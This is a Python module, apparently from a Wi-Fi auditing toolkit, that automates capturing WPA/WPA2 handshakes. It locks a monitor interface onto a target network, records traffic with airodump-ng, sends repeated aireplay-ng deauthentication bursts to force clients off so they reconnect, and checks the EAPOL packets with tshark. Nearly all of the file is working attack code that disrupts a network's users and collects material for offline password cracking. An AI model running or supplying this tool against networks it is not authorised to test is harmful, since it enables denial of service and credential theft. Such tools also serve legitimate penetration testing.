#!/usr/bin/env python3
"""
Handshake Capture Manager

Manages WPA/WPA2 handshake capture using airodump-ng with targeted attacks.
Coordinates capture, deauthentication, and validation workflows.
"""

import subprocess
import threading
import time
import logging
import os
import signal
from pathlib import Path
from typing import Optional, List, Dict, Callable, Tuple
from datetime import datetime, timedelta
from dataclasses import dataclass
from enum import Enum

from core.scanner.models import Network, Client, Handshake

logger = logging.getLogger(__name__)


class CaptureStatus(Enum):
    """Capture operation status"""
    IDLE = "idle"
    CAPTURING = "capturing"
    DEAUTHING = "deauthing"
    VALIDATING = "validating"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"


@dataclass
class CaptureConfig:
    """Configuration for handshake capture"""
    target_bssid: str
    target_channel: int
    target_ssid: Optional[str] = None

    # Capture settings
    capture_timeout: int = 300  # 5 minutes default
    write_interval: int = 2  # Write to disk every 2 seconds

    # Deauth settings
    deauth_count: int = 5  # Number of deauth packets
    deauth_interval: int = 10  # Seconds between deauth bursts
    deauth_client: Optional[str] = None  # Specific client or broadcast

    # Validation
    require_full_handshake: bool = False  # All 4 EAPOL messages
    min_quality_score: float = 60.0  # Minimum quality threshold

    # Output
    output_dir: str = "/tmp/wifi-launchpad/captures"
    save_raw_pcap: bool = True


class CaptureManager:
    """Manages handshake capture operations"""

    def __init__(self, monitor_interface: str, injection_interface: Optional[str] = None):
        """
        Initialize capture manager

        Args:
            monitor_interface: Interface for monitoring (e.g., 'wlan0mon')
            injection_interface: Interface for injection (defaults to monitor_interface)
        """
        self.monitor_interface = monitor_interface
        self.injection_interface = injection_interface or monitor_interface

        # Process management
        self.capture_process: Optional[subprocess.Popen] = None
        self.deauth_process: Optional[subprocess.Popen] = None
        self.capture_thread: Optional[threading.Thread] = None
        self.deauth_thread: Optional[threading.Thread] = None

        # State
        self.status = CaptureStatus.IDLE
        self.config: Optional[CaptureConfig] = None
        self.captured_handshake: Optional[Handshake] = None
        self.capture_start_time: Optional[datetime] = None

        # Statistics
        self.stats = {
            "deauth_packets_sent": 0,
            "capture_attempts": 0,
            "validation_checks": 0,
            "time_to_capture": 0.0
        }

        # Callbacks
        self.on_handshake_captured: Optional[Callable[[Handshake], None]] = None
        self.on_status_change: Optional[Callable[[CaptureStatus], None]] = None

        # Ensure output directory exists
        Path(self.config.output_dir if self.config else "/tmp/wifi-launchpad/captures").mkdir(
            parents=True, exist_ok=True
        )

    def capture_handshake(self, config: CaptureConfig) -> Tuple[bool, Optional[Handshake]]:
        """
        Main method to capture a handshake

        Args:
            config: Capture configuration

        Returns:
            Tuple of (success, handshake)
        """
        if self.status != CaptureStatus.IDLE:
            logger.warning("Capture already in progress")
            return False, None

        self.config = config
        self.stats["capture_attempts"] += 1
        self.capture_start_time = datetime.now()

        # Create output directory
        output_dir = Path(config.output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        # Start capture
        logger.info(f"Starting handshake capture for {config.target_bssid}")
        self._set_status(CaptureStatus.CAPTURING)

        # Set channel
        if not self._set_channel(config.target_channel):
            self._set_status(CaptureStatus.FAILED)
            return False, None

        # Start airodump-ng capture
        if not self._start_capture():
            self._set_status(CaptureStatus.FAILED)
            return False, None

        # Start capture monitoring thread
        self.capture_thread = threading.Thread(
            target=self._capture_monitor,
            daemon=True
        )
        self.capture_thread.start()

        # Start deauth thread
        self.deauth_thread = threading.Thread(
            target=self._deauth_worker,
            daemon=True
        )
        self.deauth_thread.start()

        # Wait for capture to complete or timeout
        timeout = config.capture_timeout
        start_time = time.time()

        while self.status in [CaptureStatus.CAPTURING, CaptureStatus.DEAUTHING]:
            if time.time() - start_time > timeout:
                logger.warning("Capture timeout reached")
                self._set_status(CaptureStatus.TIMEOUT)
                break
            time.sleep(1)

        # Stop capture
        self._stop_capture()

        # Calculate capture time
        if self.capture_start_time:
            self.stats["time_to_capture"] = (
                datetime.now() - self.capture_start_time
            ).total_seconds()

        # Return result
        success = self.status == CaptureStatus.SUCCESS
        return success, self.captured_handshake

    def _set_channel(self, channel: int) -> bool:
        """Set the monitor interface to specified channel"""
        try:
            subprocess.run(
                ["sudo", "iw", "dev", self.monitor_interface, "set", "channel", str(channel)],
                check=True,
                capture_output=True
            )
            logger.debug(f"Set {self.monitor_interface} to channel {channel}")
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to set channel: {e}")
            return False

    def _start_capture(self) -> bool:
        """Start airodump-ng capture process"""
        if not self.config:
            return False

        # Generate output filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_prefix = Path(self.config.output_dir) / f"handshake_{timestamp}"

        # Build airodump-ng command
        cmd = [
            "sudo", "airodump-ng",
            "--bssid", self.config.target_bssid,
            "--channel", str(self.config.target_channel),
            "--write", str(output_prefix),
            "--output-format", "pcap,csv",
            "--write-interval", str(self.config.write_interval),
            self.monitor_interface
        ]

        try:
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid
            )

            # Store output file path
            self.pcap_file = f"{output_prefix}-01.cap"

            logger.info(f"Started capture on {self.config.target_bssid}")
            return True

        except Exception as e:
            logger.error(f"Failed to start capture: {e}")
            return False

    def _stop_capture(self):
        """Stop all capture processes"""
        # Stop airodump-ng
        if self.capture_process:
            try:
                os.killpg(os.getpgid(self.capture_process.pid), signal.SIGTERM)
                self.capture_process.wait(timeout=5)
            except:
                try:
                    os.killpg(os.getpgid(self.capture_process.pid), signal.SIGKILL)
                except:
                    pass
            self.capture_process = None

        # Stop deauth
        if self.deauth_process:
            try:
                self.deauth_process.terminate()
                self.deauth_process.wait(timeout=2)
            except:
                try:
                    self.deauth_process.kill()
                except:
                    pass
            self.deauth_process = None

        # Wait for threads
        if self.capture_thread and self.capture_thread.is_alive():
            self.capture_thread.join(timeout=2)
        if self.deauth_thread and self.deauth_thread.is_alive():
            self.deauth_thread.join(timeout=2)

    def _capture_monitor(self):
        """Monitor thread to check for captured handshakes"""
        if not self.config:
            return

        check_interval = 5  # Check every 5 seconds
        pcap_file = Path(self.pcap_file)

        while self.status in [CaptureStatus.CAPTURING, CaptureStatus.DEAUTHING]:
            time.sleep(check_interval)

            if not pcap_file.exists():
                continue

            # Validate handshake in PCAP file
            self._set_status(CaptureStatus.VALIDATING)
            self.stats["validation_checks"] += 1

            handshake = self._validate_capture(str(pcap_file))

            if handshake and handshake.quality_score >= self.config.min_quality_score:
                # Success!
                self.captured_handshake = handshake
                self._set_status(CaptureStatus.SUCCESS)

                if self.on_handshake_captured:
                    self.on_handshake_captured(handshake)

                logger.info(f"Handshake captured! Quality: {handshake.quality_score:.1f}")
                break
            else:
                # Continue capturing
                self._set_status(CaptureStatus.CAPTURING)

    def _deauth_worker(self):
        """Worker thread for sending deauthentication packets"""
        if not self.config:
            return

        time.sleep(5)  # Initial delay

        for i in range(self.config.deauth_count):
            if self.status not in [CaptureStatus.CAPTURING, CaptureStatus.DEAUTHING]:
                break

            self._set_status(CaptureStatus.DEAUTHING)
            self._send_deauth()
            self.stats["deauth_packets_sent"] += 10  # Aireplay sends multiple

            # Wait between deauth bursts
            if i < self.config.deauth_count - 1:
                time.sleep(self.config.deauth_interval)

        if self.status == CaptureStatus.DEAUTHING:
            self._set_status(CaptureStatus.CAPTURING)

    def _send_deauth(self):
        """Send deauthentication packets"""
        if not self.config:
            return

        # Build aireplay-ng command
        cmd = [
            "sudo", "aireplay-ng",
            "--deauth", "10",  # Send 10 deauth packets
            "-a", self.config.target_bssid
        ]

        # Add specific client if specified
        if self.config.deauth_client:
            cmd.extend(["-c", self.config.deauth_client])

        cmd.append(self.injection_interface)

        try:
            self.deauth_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.deauth_process.wait(timeout=10)
            logger.debug(f"Sent deauth to {self.config.target_bssid}")
        except Exception as e:
            logger.error(f"Failed to send deauth: {e}")

    def _validate_capture(self, pcap_file: str) -> Optional[Handshake]:
        """
        Validate captured handshake (basic validation)
        Full validation will be in validator.py
        """
        if not self.config or not Path(pcap_file).exists():
            return None

        # Basic validation using tshark
        try:
            result = subprocess.run(
                ["tshark", "-r", pcap_file, "-Y", "eapol", "-T", "fields", "-e", "eapol.type"],
                capture_output=True,
                text=True,
                timeout=5
            )

            eapol_types = result.stdout.strip().split('\n')
            eapol_count = len([t for t in eapol_types if t])

            if eapol_count >= 2:  # Minimum for partial handshake
                handshake = Handshake(
                    bssid=self.config.target_bssid,
                    ssid=self.config.target_ssid or "Unknown",
                    client_mac="FF:FF:FF:FF:FF:FF",  # Placeholder
                    pcap_file=pcap_file,
                    file_size=Path(pcap_file).stat().st_size,
                    eapol_packets=eapol_count,
                    capture_method="deauth",
                    deauth_count=self.stats["deauth_packets_sent"],
                    time_to_capture=self.stats["time_to_capture"]
                )

                # Basic quality score
                handshake.quality_score = min(eapol_count * 25, 100)
                handshake.is_complete = eapol_count >= 4

                return handshake

        except Exception as e:
            logger.error(f"Failed to validate capture: {e}")

        return None

    def _set_status(self, status: CaptureStatus):
        """Update capture status"""
        self.status = status
        if self.on_status_change:
            self.on_status_change(status)
        logger.debug(f"Capture status: {status.value}")

    def stop(self):
        """Stop all capture operations"""
        self._stop_capture()
        self._set_status(CaptureStatus.IDLE)
        logger.info("Capture manager stopped")